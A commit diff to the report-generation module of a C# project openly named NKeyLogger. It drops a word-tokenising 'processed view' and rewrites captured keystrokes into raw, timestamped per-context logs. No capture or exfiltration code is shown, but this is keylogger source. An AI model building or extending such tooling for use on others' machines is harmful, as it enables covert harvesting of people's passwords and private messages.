fix disconnect client

+++ NKeyLogger/ReportMaker/ReportGenerator.cs
@@ -2,6 +2,7 @@
 using System.Collections.Frozen;
 using System.Collections.Generic;
 using System.Linq;
+using System.Reflection.PortableExecutable;
 using System.Runtime;
 using System.Text;
 using System.Threading.Tasks;
@@ -12,62 +13,48 @@ internal class ReportGenerator
 {
     private const short DATE_THRESHOLD = 5;
     private static string TEMP_PATH = AppDomain.CurrentDomain.BaseDirectory + "temp";
-    private static string RAW_REPORT_PATH = TEMP_PATH + "\\" + "RawReport.temp";
-    private static string PROCESSED_REPORT_PATH = TEMP_PATH + "\\" + "ProcessedReport.temp";
     private readonly Dictionary<string,Context> contextMap = new Dictionary<string,Context>();
-    private static FrozenSet<string> separators = new HashSet<string>()
-    {
-        ",", "SPACE", ";", "\"", "'", ":", "=", "+", "*", "ENTER", "(", ")", "[", "]", "<", ">", "!", "?", "TAB", " "
-    }.ToFrozenSet();
     private DirectoryInfo? dirInfo;
-    private string reportPath { get; init; }
-    public ReportGenerator(string targetPath)
+    private readonly Dictionary<string, ulong> dateMap = new Dictionary<string, ulong>();
+    private string sourcePath { get; init; }
+    public ReportGenerator(string source)
     {
-        reportPath = targetPath;
+        this.sourcePath = source;
     }
 
-    public void generate(string path)
+    public void generateRawReport(string targetPath)
     {
+
+        if (File.Exists(targetPath))
+            File.Delete(targetPath);
+
+        foreach (var item in contextMap.Values)
+            item.isFirstToken = true;
+
         dirInfo = Directory.CreateDirectory(TEMP_PATH);
-        this.isFirstToken = true;
-        contextMap.Clear();
-        using CSVReader reader = new CSVReader(path);
-        reader.EndOfFileEvent += saveTokenToProcessedFile;
-        reader.read(appendToProcessedReport);
-
-        foreach (var pair in contextMap)
-        {
-            File.AppendAllText(PROCESSED_REPORT_PATH, pair.Key + ":\n");
-            joinFile(PROCESSED_REPORT_PATH, pair.Value.TempFilePath);
-            File.Delete(pair.Value.TempFilePath);
-        }
-
-        contextMap.Clear();
+        using CSVReader reader = new CSVReader(this.sourcePath);
 
         reader.read(appendToRawReport);
         foreach (var pair in contextMap)
         {
-            File.AppendAllText(RAW_REPORT_PATH, pair.Key + ":\n");
-            joinFile(RAW_REPORT_PATH, pair.Value.TempFilePath);
+            if (!File.Exists(pair.Value.TempFilePath))
+                continue;
+            File.AppendAllText(targetPath, pair.Key + ":\r\n");
+            joinFile(targetPath, pair.Value.TempFilePath);
             File.Delete(pair.Value.TempFilePath);
+            File.AppendAllText(targetPath, "\r\n");
         }
 
-        generateFinnalyReport();
-
-        File.Delete(PROCESSED_REPORT_PATH);
-        File.Delete(RAW_REPORT_PATH);
-        dirInfo.Delete();
+        this.clear();
     }
 
-    private void generateFinnalyReport()
+    private void clear()
     {
-        File.Delete(reportPath);
-        File.AppendAllText(reportPath, "|Processed View|\r\n");
-        joinFile(reportPath, PROCESSED_REPORT_PATH);
-        File.AppendAllText(reportPath, "\r\n\r\n");
-        File.AppendAllText(reportPath, "|Raw View|\r\n");
-        joinFile(reportPath, RAW_REPORT_PATH);
+        contextMap.Clear();
+        dateMap.Clear();
+        dirInfo?.Delete();
     }
+
     private void joinFile(string mainFilePath, string childFilePath)
     {
         using (FileStream fileStream = File.Open(mainFilePath,FileMode.OpenOrCreate))
@@ -82,54 +69,6 @@ internal class ReportGenerator
             }
         }
     }
-
-    private bool isFirstToken = true;
-    private void appendToProcessedReport(KeyInfo? info)
-    {
-        if (info == null)
-            return;
-
-        bool isSep = separators.Any(elem =>
-        {
-            return elem.ToLower() == info.Key.ToLower();
-        });
-
-        KeyInfo? lastKeyInfo = getContext(info).CurrentKey;
-
-        bool isLastSep = separators.Any(elem =>
-        {
-            if(lastKeyInfo == null)
-                return false;
-            return elem.ToLower() == lastKeyInfo.Key.ToLower();
-        });
-
-        if (isLastSep && isSep)
-        {
-            return;
-        }
-
-        if (info.Key.Length == 1 && !isSep)
-        {
-            getContext(info).CurrentKey = info;
-        } else if (isSep || isChangedLang(info, lastKeyInfo))
-        {
-            Context ctx = getContext(info);
-            string token = ctx.Token;
-
-            if (token == string.Empty)
-                return;
-            string newLine = (!isFirstToken) ? "\r\n" : "";
-            if (isDateDiffMoreThreshold(info.Timestamp, lastKeyInfo?.Timestamp) || isFirstToken)
-                File.AppendAllText(ctx.TempFilePath, newLine + info.Timestamp + ": " + token.Trim() + " ");
-            else
-                File.AppendAllText(ctx.TempFilePath, token.Trim() + " ");
-
-            isFirstToken = false;
-
-        }
-
-    }
-
     private void appendToRawReport(KeyInfo? info)
     {
         if (info == null)
@@ -137,23 +76,22 @@ internal class ReportGenerator
 
         var ctx = getContext(info);
 
+        string newLine = (!ctx.isFirstToken) ? "\r\n" : "";
+        if (isDateDiffMoreThreshold(info.Timestamp, ctx.CurrentKey?.Timestamp) || ctx.isFirstToken) { 
+            File.AppendAllText(ctx.TempFilePath, newLine + info.Timestamp + ": ");
+            ctx.isFirstToken = false;
+            dateMap[info.Timestamp] = 0;
+            ctx.lastTimestamp = info.Timestamp;
+        }
+
         if (info.Key.Length > 1)
             File.AppendAllText(ctx.TempFilePath, $"[{info.Key}]");
         else
             File.AppendAllText(ctx.TempFilePath, info.Key);
-    }
 
-    private void saveTokenToProcessedFile(KeyInfo? info)
-    {
-        if(info == null) return;
+        ++dateMap[ctx.lastTimestamp];
 
-        Context ctx = getContext(info);
-        string token = ctx.Token;
-
-        if (token == string.Empty)
-            return;
-
-        File.AppendAllText(ctx.TempFilePath, token.Trim() + " ");
+        ctx.CurrentKey = info;
     }
 
     private bool isDateDiffMoreThreshold(string timestampFirst, string? timestampSecond)
@@ -165,11 +103,6 @@ internal class ReportGenerator
         return DATE_THRESHOLD < (t1 - t2).TotalMinutes;
     }
 
-    private bool isChangedLang(KeyInfo curr, KeyInfo? last){
-        if (last == null)
-            return false;
-        return curr.Language != last.Language;
-    }
     private Context getContext(KeyInfo info)
     {
         Context? ctx;
@@ -184,8 +117,9 @@ internal class ReportGenerator
     {
         private readonly string TempDirectoryPath = TempDirectoryPath;
         private string tempFilePath = "";
-        private StringBuilder token = new StringBuilder();
-        private KeyInfo? currentKey = null;
+        public  KeyInfo? CurrentKey { get; set; } = null;
+        public bool isFirstToken { get; set; } = true;
+        public string lastTimestamp { get; set; } = string.Empty;
 
         public string TempFilePath
         {
@@ -193,24 +127,6 @@ internal class ReportGenerator
             set
             {
                 tempFilePath = TempDirectoryPath + "\\" + System.IO.Path.GetFileName(value) + ".temp";
-            }
-        }
-        public KeyInfo? CurrentKey
-        {
-            get => currentKey;
-            set
-            {
-                token.Append(value?.Key);
-                currentKey = value;
-            }
-        }
-
-        public string Token
-        {
-            get { 
-                string res = (string)token.ToString().Clone();
-                token.Clear();
-                return res;
             }
         }
